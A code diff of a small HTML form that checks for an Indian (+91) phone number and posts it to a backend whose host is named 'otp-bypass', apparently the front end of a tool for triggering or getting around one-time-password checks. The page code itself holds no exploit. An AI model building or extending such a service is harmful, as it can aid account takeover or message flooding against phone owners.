@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Send Mobile Number</title>
+  <title>Send OTP</title>
 </head>
 <body>
 
@@ -11,28 +11,28 @@
   <input
     type="text"
     id="phone"
-    placeholder="Enter mobile number"
+    placeholder="+9198XXXXXXXX"
   />
 
   <br><br>
 
-  <button onclick="sendPhone()">Send OTP</button>
+  <button onclick="sendOTP()">Send OTP</button>
 
   <p id="status"></p>
 
   <script>
-    function sendPhone() {
+    function sendOTP() {
       const phone = document.getElementById("phone").value;
       const status = document.getElementById("status");
 
-      if (!phone) {
-        status.innerText = "Please enter a phone number";
+      if (!phone.startsWith("+91")) {
+        status.innerText = "Number must start with +91";
         return;
       }
 
-      status.innerText = "Sending...";
+      status.innerText = "Sending OTP...";
 
-      fetch("https://otp-bypass-1.onrender.com/send-phone", {
+      fetch("https://otp-bypass-1.onrender.com/send-otp", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -42,14 +42,14 @@
       .then(res => res.json())
       .then(data => {
         if (data.success) {
-          status.innerText = "Phone number sent successfully!";
+          status.innerText = "OTP sent successfully ✅";
         } else {
-          status.innerText = "Backend error";
+          status.innerText = "OTP NOT sent ❌";
         }
       })
       .catch(err => {
         console.error(err);
-        status.innerText = "Error sending phone number";
+        status.innerText = "Network / server error ❌";
       });
     }
   </script>
